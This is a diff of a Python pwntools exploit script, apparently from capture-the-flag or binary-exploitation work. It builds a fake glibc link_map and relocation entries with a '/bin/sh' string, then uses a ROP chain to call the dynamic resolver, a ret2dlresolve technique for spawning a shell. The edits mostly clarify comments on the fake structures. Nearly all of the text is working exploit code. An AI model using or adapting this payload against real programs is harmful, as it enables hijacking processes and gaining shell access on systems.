@@ -53,31 +53,34 @@ log.info('-' * 50)
 log.info('Making fake link_map')
 log.info(f'system - {target_func} in glibc: {hex(l_addr)}')
 
+# Start of link_map
 link_map = p64(l_addr & BITMAP_64)  # l_addr
-link_map += p64(0)  # fake link_list+8 is DT_JMPREL
+
+# DT_JMPREL, link_map+8
+link_map += p64(0)
 link_map += p64(buf + 0x18)  # fake .rel.plt address
 
-# link_map += p64((buf + 0x30 - l_addr) & BITMAP_64)
-# BUG: buf -> rbx: 0x3b7240, seg fault
-link_map += p64(buf + 0x30 - l_addr)  # rela->r_offset TODO: ?
-link_map += p64(7)  # rela->r_info
+# .rel.plt, link_map+0x18
+# rela->r_offset: normally this points to the real GOT, now we need an area to
+# read/write.
+link_map += p64(buf + 0x30 - l_addr)
+link_map += p64(7)  # rela->r_info, 7>>32=0, points to index 0 of symtab
 link_map += p64(0)  # rela->r_addend
 
 link_map += p64(0)  # l_ns
 
 # DT_SYMTAB, link_map + 0x38
 link_map += p64(0)
-link_map += p64(elf.got[target_func] - 0x8)  # fake symtab
+link_map += p64(elf.got[target_func] - 0x8)  # PTR to fake symtab
+
 link_map += b'/bin/sh\00'
 link_map = link_map.ljust(0x68, PH)
 
 # DT_STRTAB, link_map+0x68
-link_map += p64(buf)
-link_map += p64(buf + 0x38)  # DT_SYMTAB, link_map+0x70
+link_map += p64(buf)  # PTR to DT_STRTAB, we won't use it so any readable area
+link_map += p64(buf + 0x38)  # PTR to DT_SYMTAB
 link_map = link_map.ljust(0xf8, PH)
-
-# DT_JMPREL, link_map+0xf8
-link_map += p64(buf + 8)
+link_map += p64(buf + 8)  # PTR to DT_JMPREL
 
 log.info(f'Finish make link_map, size: {hex(len(link_map))}')
 
@@ -85,7 +88,6 @@ rop.read(0, buf, len(link_map))
 rop.call(resolver, [buf + 0x48, 0])
 rop.raw(buf)
 rop.raw(0)
-
 
 ###############################################################################
 # Make zip file
